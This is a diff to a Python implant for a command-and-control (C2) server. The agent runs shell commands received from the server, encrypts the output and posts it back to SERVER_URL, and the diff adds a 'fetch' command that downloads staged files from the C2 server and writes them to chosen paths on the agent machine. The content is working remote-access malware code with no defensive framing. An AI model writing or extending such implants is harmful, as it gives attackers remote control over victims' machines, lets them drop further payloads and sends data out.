@@ -61,16 +61,53 @@ def heartbeat():
 
 def beacon_command(commands):
     for cmd in commands:
-        output = execute_command(cmd["command"])
+        cmd_id = cmd["command_id"]
+        command_text = cmd["command"]
+
+        # Handle staged file fetch
+        if command_text.startswith("fetch "):
+            try:
+                _, filename, dest_path = command_text.split(" ", 2)
+                output = fetch_file(filename, dest_path) 
+            except ValueError:
+                output = "[!] Invalid fetch command format. Use: fetch <filename> <dest_path>"
+
+        # Handle Regualar Commands
+        else:
+            output = execute_command(command_text)
+
+        # Send result back to server
         try:
-            requests.post(f"{SERVER_URL}/result", json={
-                "command_id": cmd["command_id"],
-                "result": encrypt(output)
-            }, timeout=10)
+            requests.post(
+                f"{SERVER_URL}/result",
+                json={
+                    "command_id": cmd_id,
+                    "result": encrypt(output)
+                },
+                timeout=10
+            )
         except Exception as e:
             print(f"[!] Failed to send result: {e}")
 
+def fetch_file(filename, dest_path):
+    """
+    Fetch a staged file from the C2 server (/files/<filename>)
+    and save it locally on the agent machine.
+    """
+    try:
+        url = f"{SERVER_URL}/files/{filename}"
+        r = requests.get(url, timeout=15)
 
+        if r.status_code == 200:
+            with open(dest_path, "wb") as f:
+                f.write(r.content)
+            return f"[+] File {filename} fetched and saved to {dest_path}"
+        else:
+            return f"[!] Failed to fetch {filename}: HTTP {r.status_code}"
+
+    except Exception as e:
+        return f"[!] Fetch error: {e}"
+    
 def execute_command(command):
     try:
         result = subprocess.check_output(
